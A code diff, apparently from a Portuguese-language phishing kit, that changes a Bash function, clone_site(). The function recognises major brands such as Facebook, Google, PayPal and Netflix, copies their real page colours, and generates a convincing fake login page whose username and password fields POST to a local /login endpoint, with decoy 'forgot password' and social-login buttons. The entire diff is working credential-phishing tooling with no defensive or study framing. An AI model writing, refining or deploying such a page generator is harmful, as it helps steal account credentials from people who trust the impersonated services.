@@ -132,41 +132,47 @@ clone_site() {
 
         # Extrair nome do domínio pra label
         local site_name=$(echo "$target_url" | sed -E 's|https?://||;s|[^a-zA-Z0-9].||g; s|www\.||' | cut -c1-20)
+        # Padrões bem conhecidos
         local main_color="#3897f0"
         if grep -qiE 'facebook\.com|fb\.com' "$SITE_DIR/index.html"; then
-            main_color="#1877f2"
-            site_name="Facebook"
+            main_color="#1877f2"; site_name="Facebook"
         elif grep -qiE 'google\.com' "$SITE_DIR/index.html"; then
-            main_color="#4285f4"
-            site_name="Google"
+            main_color="#4285f4"; site_name="Google"
         elif grep -qiE 'twitter\.com|x\.com' "$SITE_DIR/index.html"; then
-            main_color="#1da1f2"
-            site_name="Twitter"
+            main_color="#1da1f2"; site_name="Twitter"
         elif grep -qiE 'netflix\.com' "$SITE_DIR/index.html"; then
-            main_color="#e50914"
-            site_name="Netflix"
+            main_color="#e50914"; site_name="Netflix"
         elif grep -qiE 'amazon\.com' "$SITE_DIR/index.html"; then
-            main_color="#ff9900"
-            site_name="Amazon"
+            main_color="#ff9900"; site_name="Amazon"
         elif grep -qiE 'linkedin\.com' "$SITE_DIR/index.html"; then
-            main_color="#0077b5"
-            site_name="LinkedIn"
+            main_color="#0077b5"; site_name="LinkedIn"
         elif grep -qiE 'discord\.com' "$SITE_DIR/index.html"; then
-            main_color="#5865f2"
-            site_name="Discord"
+            main_color="#5865f2"; site_name="Discord"
         elif grep -qiE 'github\.com' "$SITE_DIR/index.html"; then
-            main_color="#333333"
-            site_name="GitHub"
+            main_color="#333333"; site_name="GitHub"
         elif grep -qiE 'paypal\.com' "$SITE_DIR/index.html"; then
-            main_color="#003087"
-            site_name="PayPal"
+            main_color="#003087"; site_name="PayPal"
         elif grep -qiE 'spotify\.com' "$SITE_DIR/index.html"; then
-            main_color="#1db954"
-            site_name="Spotify"
+            main_color="#1db954"; site_name="Spotify"
         elif grep -qiE 'telegram\.org|t\.me' "$SITE_DIR/index.html"; then
-            main_color="#0088cc"
-            site_name="Telegram"
+            main_color="#0088cc"; site_name="Telegram"
         fi
+
+        # Extrair cores reais do HTML/CSS (buscar por cores comuns em login pages na ordem)
+        local detected_color=$(grep -oE 'color:\s*#([0-9a-fA-F]{3,8})' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,8}' | head -3 | tr '\n' ' ')
+        local detected_bg=$(grep -oE 'background:\s*#([0-9a-fA-F]{3,8})' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,8}' | head -3 | tr '\n' ' ')
+        [ -n "$detected_color" ] && main_color="${detected_color%% *}"
+        # Detectar bg do body
+        local body_bg=$(grep -oE 'background:\s*#([0-9a-fA-F]{3,8})' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,8}' | head -1)
+        [ -z "$body_bg" ] && body_bg="#ffffff"
+
+        # Detectar cor secundária
+        local accent_color=$(grep -oE '(background|color|border)-color:\s*#([0-9a-fA-F]{3,8})' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,8}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+        [ -z "$accent_color" ] && accent_color="$main_color"
+
+        # Detectar textos comuns
+        local text_primary=$(grep -oE '#([0-9a-fA-F]{3,8})\s*;' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,8}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+        [ -z "$text_primary" ] && text_primary="#262626"
 
         # Criar página fake
         cat > "$SITE_DIR/index.html" << ENDHTML
@@ -174,95 +180,156 @@ clone_site() {
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <title>Entrar - ${site_name}</title>
     <link rel="icon" href="favicon.png">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #fafafa;
+        html, body {
+            height: 100%;
+            font-family: system-ui, -apple-system, Roboto, "Segoe UI", sans-serif;
+            background: ${body_bg};
+        }
+        .wrap {
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            direction: ltr;
+            flex-direction: column;
+            padding: 20px 16px;
         }
-        .container {
+        .card {
             background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 40px;
-            width: 350px;
-            max-width: 90vw;
+            border: 1px solid rgba(0,0,0,0.12);
+            border-radius: 12px;
+            padding: 40px 36px;
+            width: 380px;
+            max-width: 100%;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        }
+        .logo-area {
             text-align: center;
-            margin: 10px;
+            margin-bottom: 28px;
         }
-        .logo { margin-bottom: 20px; }
-        .logo img { max-width: 170px; max-height: 80px; }
-        .site-title {
-            font-size: 28px;
-            font-weight: 300;
-            color: #262626;
-            margin: 10px 0 5px;
+        .logo-area img { max-width: 160px; max-height: 60px; object-fit: contain; }
+        .site-name {
+            font-size: 22px;
+            font-weight: 400;
+            color: ${text_primary};
+            margin-top: 4px;
         }
-        .subtitle {
-            font-size: 14px;
-            color: #8e8e8e;
-            margin-bottom: 24px;
+        .label {
+            font-size: 13px;
+            color: rgba(0,0,0,0.55);
+            margin-bottom: 18px;
+            text-align: center;
         }
-        input {
+        .field {
+            margin-bottom: 10px;
+        }
+        .field input {
             width: 100%;
-            padding: 12px;
-            margin: 4px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            font-size: 14px;
-            background: #fafafa;
+            padding: 14px 12px;
+            border: 1px solid rgba(0,0,0,0.15);
+            border-radius: 8px;
+            font-size: 15px;
+            background: ${body_bg};
+            color: ${text_primary};
+            transition: border-color .15s;
         }
-        input:focus { outline: none; border-color: ${main_color}; }
-        button {
+        .field input:focus {
+            outline: none;
+            border-color: ${main_color};
+            box-shadow: 0 0 0 3px ${main_color}22;
+        }
+        .btn {
             width: 100%;
-            padding: 10px;
-            margin: 12px 0;
+            padding: 13px;
+            margin-top: 8px;
             background: ${main_color};
             color: #fff;
             border: none;
-            border-radius: 4px;
-            font-size: 14px;
+            border-radius: 8px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            opacity: 0.9;
+            transition: background .15s;
         }
-        button:hover { opacity: 1; }
-        .divider {
-            margin: 18px 0;
-            font-size: 13px;
-            color: #8e8e8e;
-            text-transform: uppercase;
+        .btn:hover { background: ${accent_color}; }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
         }
+        .actions a {
+            font-size: 12px;
+            color: ${main_color};
+            text-decoration: none;
+        }
+        .actions a:hover { text-decoration: underline; }
+        .separator {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0;
+            font-size: 12px;
+            color: rgba(0,0,0,0.4);
+        }
+        .separator::before, .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: rgba(0,0,0,0.12);
+        }
+        .social-btn {
+            width: 100%;
+            padding: 11px;
+            background: transparent;
+            border: 1px solid rgba(0,0,0,0.15);
+            border-radius: 8px;
+            font-size: 14px;
+            color: ${text_primary};
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .social-btn:hover { background: rgba(0,0,0,0.03); }
         .footer {
             margin-top: 20px;
+            text-align: center;
             font-size: 12px;
-            color: #8e8e8e;
+            color: rgba(0,0,0,0.45);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="logo.png" alt="${site_name}" onerror="this.style.display='none'">
-            <div class="site-title">${site_name}</div>
-            <div class="subtitle">Entrar na sua conta</div>
+    <div class="wrap">
+        <div class="card">
+            <div class="logo-area">
+                <img src="logo.png" alt="" onerror="this.style.display='none'">
+                <div class="site-name">${site_name}</div>
+            </div>
+            <div class="label">Entre na sua conta para continuar</div>
+            <form method="POST" action="/login">
+                <div class="field">
+                    <input type="text" name="username" placeholder="Email, telefone ou usuário" autocomplete="username" required>
+                </div>
+                <div class="field">
+                    <input type="password" name="password" placeholder="Senha" autocomplete="current-password" required>
+                </div>
+                <button type="submit" class="btn">Entrar</button>
+                <div class="actions">
+                    <a href="#" onclick="return false;">Esqueci a senha</a>
+                </div>
+            </form>
+            <div class="separator">ou</div>
+            <button class="social-btn" onclick="return false;">Continuar com Google</button>
         </div>
-        <form method="POST" action="/login">
-            <input type="text" name="username" placeholder="Usuário, email ou telefone" required>
-            <input type="password" name="password" placeholder="Senha" required>
-            <button type="submit">Entrar</button>
-        </form>
-        <div class="divider">ou</div>
         <div class="footer">
-            <a href="#" onclick="return false;" style="color:#3897f0;text-decoration:none;">Esqueceu a senha?</a>
+            <span>© ${site_name}</span>
         </div>
     </div>
 </body>
